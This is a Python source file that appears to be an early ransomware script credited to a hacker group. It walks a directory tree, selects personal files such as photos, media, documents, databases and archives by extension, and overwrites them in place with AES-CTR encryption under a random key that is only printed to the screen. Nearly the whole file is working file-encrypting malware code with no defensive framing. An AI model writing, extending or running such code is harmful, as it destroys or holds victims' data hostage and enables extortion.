import sys
from Crypto.Cipher import AES
from Crypto.Util import Counter
import os
"""
	Creators   :  WinterFreak && Legion PythonHackers
	email      :  cyber606@protonmail.com
	phone      :  +254741106970
"""



def freezeFiles(startpath):
    ext = [
        
        'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw', 
        'mp3','mp4', 'm4a', 'aac','ogg','flac', 'wav', 'wma', 'aiff', 'ape', 
        'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp',

        'doc', 'docx', 'xls', 'xlsx', 'ppt','pptx','txt',
        'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md', 
        'yml', 'yaml', 'json', 'xml', 'csv', 
        #'exe,', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img', #it will kill the system Winter Warns
        'db', 'sql', 'dbf', 'mdb', 'iso', 
        'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak', 
    ]

    for dirpath, dirs, files in os.walk(startpath):
        for i in files:
            absolute_path = os.path.abspath(os.path.join(dirpath, i))
            frozen_ext = absolute_path.split('.')[-1]
            print(frozen_ext)
            
            if frozen_ext in ext:
                yield absolute_path
                
def encrypt_file(filename, crypto, size=16):
    with open(filename, 'r+b') as f:
        plain_ice = f.read(size)

        while plain_ice:
            ciphertext = crypto(plain_ice)
            if len(plain_ice) != len(ciphertext):
                raise ValueError(f"wintercipher({len(ciphertext)})!= plain ice({len(plain_ice)}).Not a stream cipher")

            f.seek(-len(plain_ice), 1)
            f.write(ciphertext)

            plain_ice = f.read(size)
            

def main():
	
	ICE_KEY = os.urandom(16) #test remove hardcoded shit
	print(ICE_KEY)
	ctr = Counter.new(128)
	crypt = AES.new(ICE_KEY, AES.MODE_CTR, counter=ctr)
	where_summerends = ['/home/winterfreak/Desktop/yes',]
	
	for currentDir in where_summerends:
		for files in freezeFiles(currentDir):
			print(files)
			encrypt_file(files, crypt.encrypt)
           
if __name__ == "__main__":
	main()
            
